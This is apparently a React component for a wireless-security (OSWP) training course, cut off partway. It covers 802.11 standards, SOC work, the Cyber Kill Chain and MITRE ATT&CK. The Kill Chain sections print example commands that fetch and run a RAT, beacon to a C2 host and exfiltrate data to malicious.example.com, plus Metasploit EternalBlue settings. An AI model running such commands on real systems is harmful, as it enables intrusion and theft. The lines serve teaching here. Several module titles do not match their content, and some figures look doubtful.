import React, { useState, useEffect } from 'react';
import { Book, ArrowLeft, ChevronDown, ChevronRight, Check } from 'lucide-react';
import { Link } from 'react-router-dom';
import Navigation from "../../components/Navigation";

function OSWPCourse() {
  // New course structure based on your syllabus.
  // Each module contains sections (with title and summary) and a quiz.
  const course = [
    {
      id: "module1",
      title: "Introduction to OSWP",
      sections: [
        {
          title: "Introduction to OSWP Road Map",
          summary: (
            <>
              <p><strong>Introduction to OSWP Road Map</strong></p><br></br>
              <p>
              Wireless networks are an essential part of modern communication, but they also introduce significant security risks. The Offensive Security Wireless Professional (OSWP) certification is designed to equip cybersecurity professionals with the skills to assess and exploit vulnerabilities in Wi-Fi networks.
              </p> 
              <p>
                <strong>Who Is This Course For? </strong><br></br>
              </p>
              <ul>
                <li>
                  <strong>This course is ideal for:</strong> 
                </li>
                <li>
                ✅ IT professionals responsible for securing Wi-Fi networks.
                </li>
                <li>
                ✅ Penetration testers looking to expand their skill set.
                </li>
                <li>
                ✅ Cybersecurity professionals wanting to specialize in wireless security.

                </li>
                <li>
                ✅ Ethical hackers seeking OSWP certification.

                </li>
              </ul>
              
              <p>
                <strong>What You’ll Learn? </strong><br></br>
              </p>
              <p>
              In this course, we will cover the fundamentals of Wi-Fi security, the methodologies used by attackers, and the defensive strategies to secure wireless networks. By the end, you'll have hands-on experience with real-world Wi-Fi attacks and be fully prepared for the OSWP exam.
              </p>

              <p>
              <strong> Course Structure:  </strong><br></br>
              </p>
              <p>
              This course follows a practical, hands-on approach, covering:
              </p>
              <ul>
              <li> 1️⃣ Wireless Network Basics – 802.11 standards, encryption protocols, and wireless reconnaissance.</li>
              <li>2️⃣ Packet Capture & Analysis – Using tools like Airodump-ng and Wireshark.</li>
              <li>3️⃣ Wi-Fi Exploitation Techniques – Cracking WEP, WPA/WPA2, and PMKID attacks.</li>
              <li>4️⃣ Rogue Access Points & Evil Twin Attacks – Setting up fake APs for credential theft.</li>
              <li>5️⃣ Post-Exploitation & Defense Strategies – How to protect against common wireless threats.</li>
              </ul>

              <p>
              <strong> What You Need Before Starting? </strong><br></br>
              </p>
              
              <p>

              <ul>
              <li>📌 Basic Linux knowledge (Kali Linux is recommended).</li>
              <li>📌 Understanding of networking concepts (IP addresses, DHCP, etc.).</li>
              <li>📌 A wireless network adapter that supports packet injection (e.g., ALFA AWUS036NHA).</li>
             
              </ul>
             

              By the end of this course, you will have a deep understanding of wireless security, be able to perform real-world Wi-Fi penetration tests, and be well-prepared for the OSWP exam.


              <br></br><br></br>
            👉 Let’s dive in and start hacking Wi-Fi! 🚀

              </p>
           
            </>
          )
        },
        {
          title: "Overview of IEEE 802.11 Standards",
          summary: (
            <>
              <p><strong>Overview of IEEE 802.11 Standards</strong></p>
              <p>
              This module introduces key wireless communication concepts and terminology as defined by various IEEE 802.11 protocols. Each wireless card supports specific 802.11 standards, and compatibility with other protocols may vary.
              </p> <br></br><br></br>
              <p>
                <strong>Key Monitoring Techniques:</strong>
              </p>
              
              <p>
              Understanding these protocols is crucial because both the hardware we use and the testing environment's equipment influence our work. A solid grasp of hardware capabilities allows for proper utilization. With that in mind, this module serves two main purposes.
              </p> <br></br><br></br>

              <p>
              First, it provides an overview of the different 802.11 standards and their distinctions. While memorization isn’t necessary, knowing which protocols a device supports and the frequencies it operates on is essential. <br></br>
              For instance, when capturing packets from an 802.11ac transmitter, understanding concepts like beamforming and streams can be useful in troubleshooting issues. 

              Second, this module functions as a quick reference guide. Given the breadth of terms and concepts, it's unrealistic to remember everything. Instead, when working with new hardware, revisiting this module for a refresher may prove beneficial.
              </p> <br></br><br></br>
              <p>
              <strong>802.11 Standards and Amendments</strong> <br></br>
              IEEE 802.11 is the standard for wireless local area networks (WLAN). It defines specifications for the physical layer and the Media Access Control (MAC) layer within the OSI model. <br></br>

              As wireless technology has evolved, the 802.11 committee has introduced several amendments to the original standard. Below are some key amendments:

              <ul>
                <li>802.11: The original WLAN standard.                </li>
                <li>802.11a: Supports speeds up to 54 Mbit/s on the 5 GHz band.                </li>
                <li>802.11b: Provides 5.5 Mbit/s and 11 Mbit/s speeds on the 2.4 GHz band.
                </li>
                <li>802.11g: Supports up to 54 Mbit/s on 2.4 GHz and is backward compatible with 802.11b.
                </li>
                <li>802.11h: Introduces regulatory requirements for power and transmission limits in the 5 GHz band.
                </li>
                <li>802.11i: Enhances security measures.
                </li>
                <li>802.11n: Increases throughput using Multiple Input/Multiple Output (MIMO), also known as Wi-Fi 4.
                </li>
                <li>802.11ac: Provides very high throughput below 6 GHz, commonly known as Wi-Fi 5.
                </li>
                <li>802.11ad: Enables multi-gigabit speeds in the 60 GHz band, also referred to as WiGig.
                </li>
                <li>802.11ax: Improves efficiency in wireless networks, known as Wi-Fi 6.
                </li>
              </ul>
              </p><br></br>
              <p>
              <strong>IEEE 802.11b</strong> <br></br>
              The IEEE 802.11b standard introduced Complementary Code Keying (CCK), enabling data transfer rates of 5.5 Mbps and 11 Mbps in the 2.4 GHz frequency band, which ranges from 2.4 GHz to 2.485 GHz. This standard operates across 14 channels, each 22 MHz wide. However, due to the limited spectrum, only three non-overlapping channels are available in most regions. <br></br>

            When referring to a channel frequency, the center frequency is used. The center frequency represents the midpoint of a channel’s bandwidth. For instance, channel 1 spans from 2.401 GHz to 2.423 GHz, but its center frequency is 2.412 GHz. <br></br>

           <br></br>
            <strong>IEEE 802.11a</strong>

            The IEEE 802.11a standard was introduced alongside 802.11b but operates in the 5 GHz frequency band. This provides more available channels with reduced interference compared to 2.4 GHz networks. Unlike 802.11b, which uses CCK modulation, 802.11a relies on Orthogonal Frequency-Division Multiplexing (OFDM) for transmission. This allows data rates of up to 54 Mbps over 20 MHz-wide channels.
            <br></br>

            OFDM works by dividing a channel into multiple smaller subchannels, called subcarriers, which carry data simultaneously. Each 802.11a channel consists of 64 subcarriers, with 48 used for data transmission, 4 serving as synchronization pilots, and 12 left unused. Each subcarrier has a width of 312.5 KHz.

            <br></br>

            As with 802.11b, the frequency allocation and power limits of 802.11a vary by country. Due to the complexity of 5 GHz spectrum regulations, channel availability may differ across regions and change over time.
              </p> <br></br><br></br>

              <p>
              
              <strong>IEEE 802.11g</strong>

              IEEE 802.11g builds upon 802.11b by incorporating OFDM while operating within the 2.4 GHz band. It offers improved performance and maintains backward compatibility with 802.11b devices. When an 802.11b device connects to an 802.11g network, the connection speed may drop to accommodate the older standard. <br></br>

              The channel structure in 802.11g remains the same as in 802.11b. However, channel 14 was only available in Japan for 802.11b networks. <br></br>

              Although 802.11a, 802.11b, and 802.11g sometimes utilize multiple antennas, they do not support Multiple-Input Multiple-Output (MIMO). Instead, they use Single Input Single Output (SISO) technology, where only one antenna transmits and receives at a time. In these standards, multiple antennas are primarily used for antenna diversity, which improves signal reception by selecting the strongest signal available.

              </p> <br></br><br></br>

              <p>
              
              <strong>IEEE 802.11n</strong><br></br><br></br>
              IEEE 802.11n introduced significant advancements in both speed and range for wireless networks, operating on both 2.4 GHz and 5 GHz bands. Initially, the standard allowed speeds up to 74 Mbps, with later implementations reaching up to 300 Mbps. A key improvement in 802.11n is the introduction of MIMO technology. <br></br>

            MIMO employs multiple antennas for transmitting and receiving signals, utilizing multipath propagation to improve performance. While traditional signals degrade when bouncing off obstacles, MIMO leverages these reflections to enhance data transmission.<br></br>

            The 802.11n standard supports up to four spatial streams, each requiring a separate antenna, allowing for greater data throughput. In commercial devices, up to three spatial streams are commonly available. Additionally, 802.11n supports 40 MHz-wide channels, doubling the data rate compared to 20 MHz-wide channels used in previous standards.<br></br>

            A new feature introduced in 802.11n is Greenfield mode, which optimizes wireless transmission by restricting network access to 802.11n devices only. This eliminates the need to support older standards, thereby increasing efficiency.<br></br>

            In terms of channel structure, 802.11n follows a similar subcarrier division as 802.11a and 802.11g but with slight modifications. Of the 64 subcarriers in a 20 MHz channel, 52 are used for data, 4 for pilots, and 8 remain unused.<br></br>




              
              </p> <br></br><br></br>

              <p>
               <strong>MIMO Notation and Configuration</strong>  <br></br>
               The number of streams and achievable data rates in a wireless network depend on the number of antennas on both the transmitter and receiver. The standard notation for MIMO (Multiple Input, Multiple Output) configurations follows the format t×r:s, where: <br></br>

            t represents the number of transmit (TX) chains. <br></br>

            r represents the number of receive (RX) chains. <br></br>

          s denotes the maximum number of spatial streams the radio can use.<br></br>

            For example: <br></br>

            2x2:2: 2 TX chains, 2 RX chains, and 2 streams.

            3x3:3: 3 TX chains, 3 RX chains, and 3 streams.

            An alternative notation format, tTrR, omits the stream count. Using this format:

            2T2R corresponds to 2x2:2.

            3T3R corresponds to 3x3:3. <br></br>

            The number of antennas is always equal to or greater than the number of streams. For instance, a device with four antennas might support only three streams, such as the Alfa AWUS1900 wireless adapter, which has four TX and RX chains but only supports three spatial streams (4x4:3). 
            <br></br>

            When analyzing networks, the number of streams is crucial for ensuring compatibility with client devices. A device with fewer streams than a client cannot fully decode its communication. <br></br>


            <strong>Modulation and Coding Scheme (MCS) Rates</strong> <br></br>
            i-Fi networks, particularly 802.11n, utilize various modulation techniques, coding rates, and spatial streams to achieve speeds of up to 600 Mbps (commercially around 450 Mbps). The Modulation and Coding Scheme (MCS) rate refers to specific modulation and coding combinations that influence performance. Key factors affecting MCS rates include:  <br></br>

            Modulation Type

          Coding Rate (the ratio of useful data to redundant error correction data)

        Number of Spatial Streams

        Channel Bandwidth (e.g., 20 MHz vs. 40 MHz)

        Guard Interval (time interval between frames)

Each additional spatial stream increases the data rate proportionally (e.g., doubling streams doubles the rate). While a deeper discussion of MCS is beyond this scope, understanding MCS rates is essential when analyzing Wi-Fi traffic.

                </p><br></br><br></br>

                <p> 
                <br></br>

802.11n can use HT20 (20 MHz) or HT40 (40 MHz) channels. HT40 channels combine two adjacent 20 MHz channels to increase throughput. The notation for these bonded channels includes HT40+ and HT40-: <br></br>

HT40+: The primary channel remains at the original frequency, while the secondary channel is positioned four channels above the primary. 

HT40-: The secondary channel is positioned four channels below the primary.

<br></br>

For example:

Channel 1 HT40+: Primary on channel 1, secondary on channel 5.

Channel 5 HT40-: Primary on channel 5, secondary on channel 1.

HT40+ starts at channel 1 and ends at channel 7 (9 in Europe) within the 2.4 GHz band. HT40- starts at channel 5 and ends at channel 11 (13 in Europe). Similar constraints apply to 5 GHz networks. <br></br>


Understanding these principles is essential for optimizing Wi-Fi performance and ensuring efficient data transmission in high-throughput environments.

                </p>
            </>
          )
        },
        {
          title: "A Day In the Life SOC",
          summary: (
            <>
              <p><strong>A Typical Day for a SOC Analyst</strong></p>
              <p>
                The daily routine of a SOC analyst is dynamic, demanding constant vigilance and rapid response to evolving threats. While each day may present unique challenges, a typical day involves a combination of monitoring, investigation, collaboration, and continuous learning.
              </p>
              <p>
                <strong>Morning Briefing and Handoff:</strong>
              </p>
              <p>
                The day begins with a morning briefing, where the outgoing shift provides a detailed handoff covering overnight incidents, active alerts, and ongoing investigations. This briefing ensures that every team member is aware of the current threat landscape and priorities.
              </p>
              <p>
                <strong>Start-of-Shift Activities:</strong>
              </p>
              <ul>
                <li>Log into the SIEM dashboard to review current alerts and system statuses.</li>
                <li>Check emails and incident reports for escalations or updates.</li>
                <li>Verify that all monitoring systems (firewalls, IDS/IPS, endpoint tools) are functioning correctly.</li>
              </ul>
              <p>
                <strong>Midday: Triage, Analysis, and Investigation</strong>
              </p>
              <p>
                As the day progresses, SOC analysts actively monitor alerts. A high-priority alert—such as unusual outbound traffic—may trigger a detailed investigation. Analysts will analyze log data, use tools like Wireshark for packet captures, and run Splunk queries such as:
              </p>
              <pre>{`# Example Splunk query to identify high traffic volumes
  index=network sourcetype=netflow 
  | stats sum(bytes) as total_bytes by src_ip, dest_ip 
  | where total_bytes > 100000000`}</pre>
              <p>
                This query helps pinpoint potential data exfiltration or DDoS attacks. Collaborative efforts with incident response teams help determine if the incident is part of a broader attack.
              </p>
              <p>
                <strong>Afternoon: Collaboration and Documentation</strong>
              </p>
              <p>
                Throughout the day, analysts communicate with team members, participate in briefings, and update incident documentation. Detailed incident reports are created for every confirmed threat, capturing the timeline, actions taken, and lessons learned.
              </p>
              <p>
                <strong>End-of-Shift and Handoff:</strong>
              </p>
              <p>
                As the shift nears its end, analysts compile a comprehensive handoff report summarizing incidents, investigations, and actions taken during the day. This ensures a smooth transition to the incoming team and continuity in threat monitoring.
              </p>
              <p>
                <strong>Real-World Example:</strong> In one day, an analyst might handle a phishing campaign alert, investigate lateral movement within the network, and document a potential data exfiltration incident. Their findings and actions are then shared with the next shift to maintain situational awareness.
              </p>
              <p>
                A day in the life of a SOC analyst is both challenging and rewarding. Continuous learning, team collaboration, and adapting to new threats are essential components of a successful SOC operation.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What does SOC stand for?",
            options: [
              "Security Operations Center",
              "System Operations Center",
              "Security Optimization Center",
              "System Optimization Center"
            ],
            correctAnswer: "Security Operations Center"
          }
        ]
      }
    },
    {
      id: "module2",
      title: "Wireless Network Analysis & Reconnaissance",
      sections: [
        {
          title: "Introduction",
          summary: (
            <>
              <p>
                <strong>Understanding the Cyber Kill Chain</strong>
              </p>
              <p>
                The Cyber Kill Chain is a model developed by Lockheed Martin to describe the stages of a cyber attack. It outlines the step-by-step process that adversaries follow, from initial reconnaissance to achieving their objectives. By understanding each stage, organizations can develop strategies to detect, disrupt, and ultimately defend against advanced persistent threats.
              </p>
              <p>
                The model is widely used in cybersecurity as it provides a structured way to analyze attacks and implement defensive measures. It emphasizes that attackers must successfully complete each stage before achieving their final objective, making it possible to interdict the attack at multiple points along the chain.
              </p>
              <p>
                <strong>Key Benefits of the Cyber Kill Chain:</strong>
              </p>
              <ul>
                <li>Provides a clear, step-by-step framework for understanding cyber attacks.</li>
                <li>Helps security teams identify and disrupt attacks at various stages.</li>
                <li>Facilitates communication and collaboration between incident response teams.</li>
                <li>Drives the development of proactive defense measures and threat intelligence.</li>
              </ul>
              <p>
                <strong>Example:</strong> Consider an attacker planning a data breach. If defenders can disrupt the attack during the reconnaissance or delivery phase, the attacker may never reach the exploitation and installation stages. This layered defense approach is at the heart of the Cyber Kill Chain model.
              </p>
              <p>
                In this course, we will explore each stage of the Cyber Kill Chain in detail, providing practical examples, tools, and strategies to help you understand how to detect and prevent attacks.
              </p>
            </>
          )
        },
        {
          title: "Reconnaissance",
          summary: (
            <>
              <p>
                <strong>Gathering Intelligence on the Target</strong>
              </p>
              <p>
                Reconnaissance is the first stage of the Cyber Kill Chain, where attackers collect as much information as possible about their target. This phase is all about gathering intelligence to plan the subsequent stages of the attack.
              </p>
              <p>
                <strong>Techniques Used in Reconnaissance:</strong>
              </p>
              <ul>
                <li>
                  <strong>Open Source Intelligence (OSINT):</strong> Using publicly available information, such as social media, company websites, and public records, to gather details about the target.
                </li>
                <li>
                  <strong>Network Scanning:</strong> Tools like Nmap are used to identify live hosts, open ports, and services running on the target network.
                  <br /><code>{`nmap -A target-ip`}</code>
                </li>
                <li>
                  <strong>Web Footprinting:</strong> Analyzing a target’s online presence to gather domain information, server details, and potential vulnerabilities.
                </li>
                <li>
                  <strong>Social Engineering:</strong> Researching employee profiles on social media or professional networks to identify potential entry points.
                </li>
              </ul>
              <p>
                <strong>Example Scenario:</strong> An attacker uses a tool like Shodan to search for publicly accessible devices with default credentials. Combined with OSINT techniques, the attacker builds a profile of the target’s network infrastructure and personnel.
              </p>
              <p>
                Effective reconnaissance not only helps the attacker refine their strategy but also provides defenders with the opportunity to identify exposed assets and tighten security measures.
              </p>
            </>
          )
        },
        {
          title: "Weaponization",
          summary: (
            <>
              <p>
                <strong>Crafting the Attack Payload</strong>
              </p>
              <p>
                Weaponization is the stage where the attacker prepares the malicious payload by coupling it with an exploit. This phase involves taking the information gathered during reconnaissance and using it to develop a weapon that can breach the target’s defenses.
              </p>
              <p>
                <strong>Key Processes in Weaponization:</strong>
              </p>
              <ul>
                <li>
                  <strong>Exploit Development:</strong> Creating or selecting an exploit that takes advantage of a known vulnerability in the target system.
                </li>
                <li>
                  <strong>Payload Creation:</strong> Generating the malicious code (e.g., malware, ransomware, backdoor) that will be executed on the target system.
                </li>
                <li>
                  <strong>Coupling Exploit and Payload:</strong> Tools like Metasploit allow attackers to combine exploits with payloads. For example:
                  <br /><code>{`use exploit/windows/smb/ms17_010_eternalblue`}</code>
                  <br /><code>{`set PAYLOAD windows/x64/meterpreter/reverse_tcp`}</code>
                </li>
              </ul>
              <p>
                <strong>Example:</strong> An attacker might weaponize a phishing email by embedding a malicious document that exploits a zero-day vulnerability in a popular PDF reader. When the target opens the document, the payload executes and establishes a foothold in the system.
              </p>
              <p>
                The success of this stage depends on the attacker’s ability to accurately match the payload with the discovered vulnerabilities and bypass security controls.
              </p>
            </>
          )
        },
        {
          title: "Delivery",
          summary: (
            <>
              <p>
                <strong>Transmitting the Malicious Payload</strong>
              </p>
              <p>
                Delivery is the phase in which the weaponized payload is transmitted to the target. The attacker chooses a delivery method based on the target's vulnerabilities and the information gathered during reconnaissance.
              </p>
              <p>
                <strong>Common Delivery Methods:</strong>
              </p>
              <ul>
                <li>
                  <strong>Phishing Emails:</strong> Crafting emails that appear legitimate to lure targets into opening malicious attachments or clicking on harmful links.
                </li>
                <li>
                  <strong>Drive-by Downloads:</strong> Hosting malicious code on compromised or malicious websites that automatically download malware when visited.
                </li>
                <li>
                  <strong>Removable Media:</strong> Using USB drives or other physical media to deliver malware. For example, leaving a USB drive labeled “Confidential” in a public area.
                </li>
                <li>
                  <strong>Exploiting Web Applications:</strong> Injecting malicious code into vulnerable websites or exploiting insecure file upload functionalities.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A spear phishing email might be sent to a company’s finance department with a subject like “Urgent Invoice Update.” The email includes a malicious attachment that, once opened, triggers the execution of the payload.
              </p>
              <p>
                The delivery method is crucial because it must bypass security filters, avoid detection, and successfully reach the target system.
              </p>
            </>
          )
        },
        {
          title: "Exploitation",
          summary: (
            <>
              <p>
                <strong>Triggering the Malicious Code</strong>
              </p>
              <p>
                Exploitation is the phase where the payload, once delivered, takes advantage of a vulnerability to execute on the target system. This stage is where the actual breach occurs, and unauthorized access is gained.
              </p>
              <p>
                <strong>Exploitation Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Buffer Overflows:</strong> Exploiting a software bug where more data is written to a buffer than it can hold, allowing the attacker to execute arbitrary code.
                </li>
                <li>
                  <strong>Code Injection:</strong> Injecting malicious code into an application through unsanitized input fields.
                </li>
                <li>
                  <strong>Privilege Escalation:</strong> Exploiting vulnerabilities to gain higher-level privileges on a system.
                </li>
                <li>
                  <strong>Zero-Day Exploits:</strong> Taking advantage of vulnerabilities that are unknown to the vendor, leaving no patch available.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A common scenario is when an attacker sends a phishing email with a malicious attachment. When the target opens the file, an exploit is triggered that takes advantage of an unpatched vulnerability in the document viewer, thereby granting the attacker remote access.
              </p>
              <p>
                Exploitation requires a precise match between the payload and the vulnerability. The more specific the exploit, the harder it is to defend against.
              </p>
            </>
          )
        },
        {
          title: "Installation",
          summary: (
            <>
              <p>
                <strong>Establishing Persistence on the Target System</strong>
              </p>
              <p>
                After successful exploitation, the attacker aims to install malware or backdoors to maintain persistent access to the compromised system. The installation phase ensures that the attacker can return even if the initial vulnerability is patched.
              </p>
              <p>
                <strong>Key Installation Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Droppers and Downloaders:</strong> Tools that download and install additional malware components onto the target.
                </li>
                <li>
                  <strong>Rootkits:</strong> Software designed to hide the presence of malicious code and provide continued access.
                </li>
                <li>
                  <strong>Persistence Mechanisms:</strong> Modifying registry keys, scheduled tasks, or startup scripts to ensure that malware runs each time the system boots.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  A droplet might execute a script that downloads a remote access tool (RAT) from an attacker-controlled server:
                  <br /><code>{`wget http://malicious.example.com/rat.exe -O rat.exe && rat.exe`}</code>
                </li>
                <li>
                  A rootkit might modify system files to remain hidden from antivirus software.
                </li>
              </ul>
              <p>
                The installation phase is critical because it sets up the attacker’s foothold and enables long-term control over the compromised system.
              </p>
            </>
          )
        },
        {
          title: "Command & Control",
          summary: (
            <>
              <p>
                <strong>Establishing Communication with the Attacker</strong>
              </p>
              <p>
                The Command & Control (C2) stage is where the attacker establishes a communication channel with the compromised system. This channel is used to send commands, update payloads, and exfiltrate data.
              </p>
              <p>
                <strong>Key Components of C2 Infrastructure:</strong>
              </p>
              <ul>
                <li>
                  <strong>C2 Servers:</strong> The remote servers controlled by the attacker, which issue commands and receive data from the compromised host.
                </li>
                <li>
                  <strong>Communication Protocols:</strong> Commonly used protocols include HTTP/HTTPS, DNS tunneling, and custom protocols that can bypass firewalls.
                </li>
                <li>
                  <strong>Stealth Techniques:</strong> Methods like domain fluxing, fast-flux DNS, and encrypted channels are used to evade detection.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  A compromised system might initiate a connection to a C2 server using HTTPS:
                  <br /><code>{`curl -X POST https://c2.example.com/command -d "id=1234&cmd=update"`}</code>
                </li>
                <li>
                  Attackers may use tools like Cobalt Strike to establish and manage C2 channels.
                </li>
              </ul>
              <p>
                Maintaining a robust C2 channel allows attackers to control the compromised system remotely, issue commands for further actions, and exfiltrate valuable data, making this stage a critical component of advanced persistent threats.
              </p>
            </>
          )
        },
        {
          title: "Actions on Objectives (Exfiltration)",
          summary: (
            <>
              <p>
                <strong>Achieving the Attacker's Goals</strong>
              </p>
              <p>
                The final stage of the Cyber Kill Chain is where the attacker achieves their objectives. These objectives may include data exfiltration, data destruction, system disruption, or espionage. Once the attacker has established persistence and communication, they begin to extract valuable data or execute destructive actions.
              </p>
              <p>
                <strong>Common Objectives:</strong>
              </p>
              <ul>
                <li>
                  <strong>Data Exfiltration:</strong> Stealing sensitive data such as intellectual property, financial records, or personal information. This can be done using encrypted channels or covert transfer protocols.
                </li>
                <li>
                  <strong>Data Destruction:</strong> Deleting or corrupting data to disrupt business operations or cover tracks.
                </li>
                <li>
                  <strong>Credential Harvesting:</strong> Extracting user credentials and other authentication tokens to enable further access.
                </li>
                <li>
                  <strong>System Disruption:</strong> Launching ransomware attacks or other forms of cyber sabotage.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  An attacker exfiltrates data using a command like:
                  <br /><code>{`tar -czf /tmp/data.tar.gz /sensitive_data && scp /tmp/data.tar.gz attacker@malicious.example.com:/exfil`}</code>
                </li>
                <li>
                  Another scenario involves deploying ransomware that encrypts files and demands payment for decryption.
                </li>
              </ul>
              <p>
                By understanding the final objectives of an attack, defenders can implement measures to detect unusual data transfers, monitor network traffic for signs of exfiltration, and employ data loss prevention (DLP) solutions to stop sensitive data from leaving the organization.
              </p>
              <p>
                In summary, the Actions on Objectives stage is where the attacker reaps the rewards of their efforts. Effective monitoring and prevention mechanisms at this stage can help organizations mitigate the impact of successful breaches.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "Which stage comes first in the Cyber Kill Chain?",
            options: [
              "Reconnaissance",
              "Delivery",
              "Exploitation",
              "Installation"
            ],
            correctAnswer: "Reconnaissance"
          }
        ]
      }
    },
    {
      id: "module3",
      title: "Wireless Attacks & Exploitation",
      sections: [
        {
          title: "What is the MITRE ATT&CK framework",
          summary: (
            <>
              <p>
                <strong>Overview</strong>
              </p>
              <p>
                The MITRE ATT&CK framework is a globally-accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations. Developed by MITRE, it provides a comprehensive and structured taxonomy that describes the various stages of a cyber attack. This framework is used by security professionals to better understand how adversaries operate, to assess security posture, and to improve detection and response strategies.
              </p>
              <p>
                <strong>Key Components:</strong> The framework is divided into tactics (the “why” of an attack), techniques (the “how”), and procedures (detailed implementation methods). It spans various attack surfaces and includes a wealth of historical data and examples that can be used for threat hunting, incident response, and red teaming.
              </p>
              <p>
                <strong>Real-World Example:</strong> For instance, if an organization is experiencing unusual lateral movement in their network, an analyst can reference the MITRE ATT&CK framework to determine which techniques (such as "Pass the Hash" or "Remote File Copy") are commonly used for lateral movement. This contextual information can then guide the investigation and the deployment of specific countermeasures.
              </p>
              <p>
                Additionally, organizations use the framework to map their existing security controls against known adversary behaviors and identify gaps in their defenses.
              </p>
              <p>
                <strong>Code Snippet Example:</strong> In a SIEM system, you might tag events with MITRE ATT&CK IDs to correlate alerts:
              </p>
              <pre>{`# Pseudo-code example for tagging logs
    if event.description.contains("lateral movement"):
        event.tag = "T1021"  # T1021: Remote Services (Lateral Movement)
    `}</pre>
              <p>
                The MITRE ATT&CK framework has become an essential tool for modern cybersecurity, enabling organizations to take a proactive stance in understanding and mitigating threats.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK Matrix",
          summary: (
            <>
              <p>
                <strong>The Structure of the ATT&CK Matrix</strong>
              </p>
              <p>
                The MITRE ATT&CK Matrix is a visual representation of the adversary tactics and techniques compiled in the ATT&CK framework. The matrix organizes tactics as columns and techniques as rows, allowing analysts to quickly see which techniques are used across different stages of an attack.
              </p>
              <p>
                <strong>How to Read the Matrix:</strong> Each cell in the matrix represents a technique used to achieve a particular tactical goal. For example, a cell might indicate that "Credential Dumping" is a technique under the "Credential Access" tactic.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  <strong>Tactic:</strong> Initial Access  
                  <br /><strong>Technique:</strong> Spear Phishing (T1566)
                </li>
                <li>
                  <strong>Tactic:</strong> Lateral Movement  
                  <br /><strong>Technique:</strong> Remote Services (T1021)
                </li>
              </ul>
              <p>
                The matrix serves as a valuable reference for security teams. By mapping observed attack behaviors to the matrix, analysts can determine which areas of their defenses may require strengthening.
              </p>
              <p>
                <strong>Interactive Example:</strong> Some organizations use interactive dashboards where clicking on a tactic reveals detailed descriptions, mitigations, and real-world case studies of associated techniques.
              </p>
              <p>
                Overall, the ATT&CK Matrix provides a holistic view of the attack landscape, enabling more effective threat modeling and defense planning.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK for Cloud Matrix",
          summary: (
            <>
              <p>
                <strong>Introduction to the Cloud Matrix</strong>
              </p>
              <p>
                As organizations increasingly migrate to cloud environments, the MITRE ATT&CK for Cloud Matrix was developed to address the unique tactics and techniques used by adversaries in cloud-based attacks. It complements the enterprise matrix by focusing on cloud-specific attack vectors.
              </p>
              <p>
                <strong>Key Components:</strong> The Cloud Matrix organizes cloud attack techniques under tactics tailored to cloud environments, such as “Resource Development” and “Initial Access” with cloud-specific nuances.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  <strong>Initial Access:</strong> Techniques like "Valid Accounts" (T1078) are adapted for cloud scenarios where attackers may use stolen credentials to access cloud services.
                </li>
                <li>
                  <strong>Execution:</strong> Techniques that involve exploiting cloud management interfaces or misconfigured API gateways.
                </li>
              </ul>
              <p>
                Cloud environments require special attention due to their dynamic and scalable nature. The MITRE ATT&CK for Cloud Matrix helps organizations identify vulnerabilities in cloud configurations, enforce best practices, and detect anomalies that might indicate a breach.
              </p>
              <p>
                <strong>Real-World Example:</strong> An attacker might exploit a misconfigured AWS S3 bucket to exfiltrate sensitive data. Mapping this behavior to the cloud matrix enables security teams to quickly pinpoint the relevant tactics and techniques and deploy targeted countermeasures.
              </p>
              <p>
                The Cloud Matrix is a vital tool for any organization leveraging cloud services, ensuring that security measures are as dynamic and scalable as the environments they protect.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK tactics",
          summary: (
            <>
              <p>
                <strong>Understanding Tactics in the ATT&CK Framework</strong>
              </p>
              <p>
                Tactics in the MITRE ATT&CK framework represent the adversary’s strategic objectives during an attack. They are the high-level goals that attackers aim to achieve, such as gaining initial access, maintaining persistence, and exfiltrating data.
              </p>
              <p>
                <strong>Common Tactics Include:</strong>
              </p>
              <ul>
                <li>
                  <strong>Initial Access:</strong> Techniques used to gain an initial foothold in the target environment (e.g., phishing, exploitation of vulnerabilities).
                </li>
                <li>
                  <strong>Execution:</strong> Methods by which attackers run malicious code on a target system.
                </li>
                <li>
                  <strong>Persistence:</strong> Strategies to maintain access over time, even if initial vulnerabilities are patched.
                </li>
                <li>
                  <strong>Privilege Escalation:</strong> Techniques used to gain higher-level permissions on a system.
                </li>
                <li>
                  <strong>Defense Evasion:</strong> Methods to avoid detection by security tools.
                </li>
                <li>
                  <strong>Credential Access:</strong> Techniques aimed at stealing authentication credentials.
                </li>
                <li>
                  <strong>Discovery:</strong> Actions taken to gather information about the target environment.
                </li>
                <li>
                  <strong>Lateral Movement:</strong> Techniques to move through the network after initial compromise.
                </li>
                <li>
                  <strong>Collection:</strong> Strategies to gather data of interest.
                </li>
                <li>
                  <strong>Exfiltration:</strong> Methods used to extract data from the target.
                </li>
                <li>
                  <strong>Impact:</strong> Actions intended to disrupt, degrade, or destroy systems.
                </li>
              </ul>
              <p>
                <strong>Example Scenario:</strong> An attacker might first use phishing to achieve initial access, then employ credential access techniques to steal passwords, followed by lateral movement to access critical systems, and finally exfiltrate data. Each of these steps corresponds to a distinct tactic in the framework.
              </p>
              <p>
                Understanding these tactics allows defenders to map observed behaviors to specific adversary objectives and to tailor their defensive strategies accordingly.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK techniques",
          summary: (
            <>
              <p>
                <strong>Deep Dive into Techniques</strong>
              </p>
              <p>
                Techniques in the MITRE ATT&CK framework detail the specific methods used by adversaries to achieve each tactic. They provide granular insight into how attacks are executed, allowing security teams to develop precise detection and mitigation strategies.
              </p>
              <p>
                <strong>Examples of Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Phishing (T1566):</strong> A common technique under Initial Access, where attackers send deceptive emails to trick users into revealing sensitive information.
